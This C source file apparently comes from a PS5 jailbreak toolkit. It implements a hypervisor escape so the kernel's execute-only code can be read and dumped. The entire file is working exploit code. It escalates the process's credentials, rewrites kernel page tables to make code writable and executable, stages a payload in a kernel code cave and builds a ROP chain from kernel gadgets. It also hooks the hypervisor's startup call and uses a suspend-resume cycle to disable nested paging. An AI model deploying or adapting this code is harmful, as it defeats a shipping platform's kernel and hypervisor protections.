/*
 * ot_defeat.c -- XOM defeat for the offsets tool (see ot_defeat.h).
 *
 * The escape + resume-hook path is ported from pLinux5-NG's
 * source/hv/defeat/hv_defeat_1320.c (itself based on Byepervisor-Reborn). The
 * Linux-boot staging, the takeover and the diagnostic self-tests are dropped:
 * here we only need .text to become readable so it can be dumped.
 *
 * SPDX-License-Identifier: AGPL-3.0-only
 */
#include "ot_defeat.h"

#include "break_hv.h"
#include "escape.h"
#include "ot_env.h"
#include "utils.h"

#include <ps5/kernel.h>

#include "byepervisor/kdlsym.h"
#include "byepervisor/khook.h"
#include "byepervisor/paging.h"

#include <stddef.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>

#define STATE_ARMED 0x4B484F4F4B454401ULL /* 'KHOOKED.' */
#define COOKIE_VAL 0xCAFE133741414141ULL
#define HOOK_CORE 0
#define HOOK_IST 6
#define TSS_STRIDE 0x68
#define STARTUP_MP_PAYLOAD_PAGE 0x3FFFF000ULL

#define CAVE_STATE_OFF 0x600
#define CAVE_SAVE_OFF 0x620

/* HV-loader carveout base. Regular (retail) units; the Pro variant differs but
 * sceKernelGetMainSocId() is not resolvable by elfldr on retail. */
#define HV_LOADER_PA_REGULAR 0x062800000ULL

static uint64_t g_oracle;

/* khook wants int-returning read/write pointers; the inline helpers are void. */
static int by_read(uint64_t kaddr, void *dst, size_t len) {
  kread(kaddr, dst, len);
  return 0;
}

static int by_write(uint64_t kaddr, const void *src, size_t len) {
  kwrite(kaddr, (void *)src, len);
  return 0;
}

int ot_defeat_supported(void) {
  return kdlsym(KERNEL_SYM_HV_MP_STARTUP_CALL) != 0;
}

/* Make kernel .text RW and clear XOTEXT so it can be patched/read. */
static void escape_kernel_text(uint64_t kernel_pmap) {
  for (uint64_t addr = ktext; addr < kdata; addr += 0x1000) {
    uint64_t entry_addr, entry;

    entry_addr = find_pde(kernel_pmap, addr, &entry);
    if (entry_addr != 0xFFFFFFFFFFFFFFFFULL) {
      CLEAR_PDE_BIT(entry, XOTEXT);
      SET_PDE_BIT(entry, RW);
      kwrite64(entry_addr, entry);
    }

    entry_addr = find_pte(kernel_pmap, addr, &entry);
    if (entry_addr != 0xFFFFFFFFFFFFFFFFULL) {
      CLEAR_PDE_BIT(entry, XOTEXT);
      SET_PDE_BIT(entry, RW);
      kwrite64(entry_addr, entry);
    }
  }
}

/* Clear NX on the payload page's translation so break_hv can execute from the
 * dmap alias the HV redirects to. */
static void map_payload_executable(uint64_t pmap) {
  uint64_t va = kdldmap(STARTUP_MP_PAYLOAD_PAGE);
  uint64_t entry_addr, entry;

  entry_addr = find_pml4e(pmap, va, &entry);
  if (entry_addr != 0xFFFFFFFFFFFFFFFFULL) {
    CLEAR_PDE_BIT(entry, EXECUTE_DISABLE);
    kwrite64(entry_addr, entry);
  }
  entry_addr = find_pdpe(pmap, va, &entry);
  if (entry_addr != 0xFFFFFFFFFFFFFFFFULL) {
    CLEAR_PDE_BIT(entry, EXECUTE_DISABLE);
    kwrite64(entry_addr, entry);
  }
  entry_addr = find_pde(pmap, va, &entry);
  if (entry_addr != 0xFFFFFFFFFFFFFFFFULL) {
    CLEAR_PDE_BIT(entry, EXECUTE_DISABLE);
    kwrite64(entry_addr, entry);

    if (PDE_FIELD(entry, PS) != 1) {
      entry_addr = find_pte(pmap, va, &entry);
      if (entry_addr != 0xFFFFFFFFFFFFFFFFULL) {
        CLEAR_PDE_BIT(entry, EXECUTE_DISABLE);
        kwrite64(entry_addr, entry);
      }
    }
  }
}

/*
 * Stage break_hv into the kernel cave and install the S3-resume khook on
 * KERNEL_SYM_HV_MP_STARTUP_CALL, redirecting its RSI to the payload so break_hv
 * runs and disables NPT. Param layout matches break_hv's entry.S.
 */
static int install_resume_hook(uint64_t cave_addr) {
  khook_t hook;
  kh_chain_t chain;
  uint8_t chain_buf[0x800];
  uint64_t scratch = kdlsym(KERNEL_SYM_DATA_CAVE);
  uint64_t oracle = scratch + KH_OFF_USER;
  uint64_t payload_va = kdldmap(STARTUP_MP_PAYLOAD_PAGE);
  uint64_t hv_base = HV_LOADER_PA_REGULAR;
  uint64_t kernel_cr3 = kread64(kdlsym(KERNEL_SYM_PMAP_STORE) + 0x28);
  int ret;

  kwrite(scratch + 0x1000, break_hv_bin, break_hv_bin_len);
  notify("[ot] defeat: payload staged @ cave+0x1000, hv_base=%#lx cr3=%#lx\n",
         (unsigned long)hv_base, (unsigned long)kernel_cr3);

  kwrite64(oracle, 0);

  ret = kh_init(&hook, by_read, by_write, ktext, scratch, HOOK_IST);
  if (ret) {
    notify("[ot] defeat: kh_init rc=%d\n", ret);
    return ret;
  }

  hook.tss_stride = TSS_STRIDE;
  kh_set_tables(&hook, kdlsym(KERNEL_SYM_IDT_ARRAY),
                kdlsym(KERNEL_SYM_COMMON_TSS));
  kh_set_core(&hook, HOOK_CORE);
  hook.oneshot = 1;

  kh_set_hook_target(&hook, kdlsym(KERNEL_SYM_HV_MP_STARTUP_CALL));
  kh_set_resume_rsi(&hook, payload_va);
  kh_set_resume_rdx(&hook, kernel_cr3);

  kh_chain_init(&chain, chain_buf, sizeof chain_buf);
  kh_chain_store(&chain, oracle, COOKIE_VAL);

  kh_chain_g(&chain, KERNEL_GADGET_POP_RDX);
  kh_chain_q(&chain, kernel_cr3);
  kh_chain_g(&chain, KERNEL_GADGET_POP_RCX);
  kh_chain_q(&chain, oracle + 0x08);
  kh_chain_g(&chain, KERNEL_GADGET_ST_RCX_RDX);

  kh_chain_memcpy(&chain, payload_va, scratch + 0x1000, 0xF00);

  kh_chain_store(&chain, payload_va + 0xF00,
                 kdlsym(KERNEL_SYM_MP_STARTUP_INIT_VECTOR));
  kh_chain_store(&chain, payload_va + 0xF08, kdldmap(0)); /* dmap */
  kh_chain_store(&chain, payload_va + 0xF10, oracle);     /* cookie addr */
  kh_chain_store(&chain, payload_va + 0xF18, hv_base);    /* carveout */
  kh_chain_store(&chain, payload_va + 0xF20, hv_base + rawoff(HV_SYM_HEAP_BASE));
  kh_chain_store(&chain, payload_va + 0xF28, hv_base + rawoff(HV_SYM_PCPUS));

  if (chain.err) {
    notify("[ot] defeat: chain overflow (cap=%u)\n", (unsigned)chain.cap);
    return -1;
  }

  ret = kh_install(&hook, &chain);
  if (ret) {
    notify("[ot] defeat: kh_install rc=%d\n", ret);
    return ret;
  }

  pin_to_core(HOOK_CORE);
  kh_trigger(&hook);

  g_oracle = oracle;
  kwrite64(cave_addr + CAVE_STATE_OFF, STATE_ARMED);
  kwrite64(cave_addr + CAVE_SAVE_OFF + 0x00, hook.saved_gate_lo);
  kwrite64(cave_addr + CAVE_SAVE_OFF + 0x08, hook.saved_gate_hi);
  kwrite64(cave_addr + CAVE_SAVE_OFF + 0x10, hook.saved_ist);
  return 0;
}

int ot_defeat(void) {
  uint64_t cave_addr, oracle, kernel_pmap;
  uint64_t cookie = 0;
  int ret;

  /* Kernel R/W without tripping the guest permission checks. */
  kernel_set_ucred_authid(getpid(), 0x4800000000000007ULL);
  pin_to_core(HOOK_CORE);

  cave_addr = kdlsym(KERNEL_SYM_DATA_CAVE);
  kernel_pmap = kdlsym(KERNEL_SYM_PMAP_STORE);
  oracle = cave_addr + KH_OFF_USER;

  notify("[ot] defeat: cave=%#lx pmap=%#lx oracle=%#lx\n",
         (unsigned long)cave_addr, (unsigned long)kernel_pmap,
         (unsigned long)oracle);

  if (kread64(cave_addr + CAVE_STATE_OFF) == STATE_ARMED) {
    notify("[ot] defeat: hook already armed (state survived).\n");
  } else {
    escape_kernel_text(kernel_pmap);
    map_payload_executable(kernel_pmap);

    ret = install_resume_hook(cave_addr);
    if (ret) {
      notify("[ot] defeat: escape arm failed (%d).\n", ret);
      return ret;
    }

    notify("[ot] defeat: armed. Entering rest mode -- wake the console when "
           "the light stops blinking.\n");
    enter_rest_mode();
  }

  /* enter_rest_mode() only requests suspend and returns; the process freezes
   * when the console actually sleeps. Poll until break_hv stamps the cookie,
   * which only happens on a genuine resume with NPT disabled. */
  for (int i = 0; i < 300; i++) {
    cookie = kread64(oracle);
    if (cookie != 0)
      break;
    sleep(2);
  }
  if (cookie == 0) {
    notify("[ot] defeat: never resumed / break_hv never ran (no cookie).\n");
    return -1;
  }

  notify("[ot] defeat: resumed; NPT disabled (cookie=%#lx). .text readable.\n",
         (unsigned long)cookie);
  log_reopen();
  for (int s = 0; s < 3; s++) {
    sleep(1);
    log_reopen();
  }
  return 0;
}
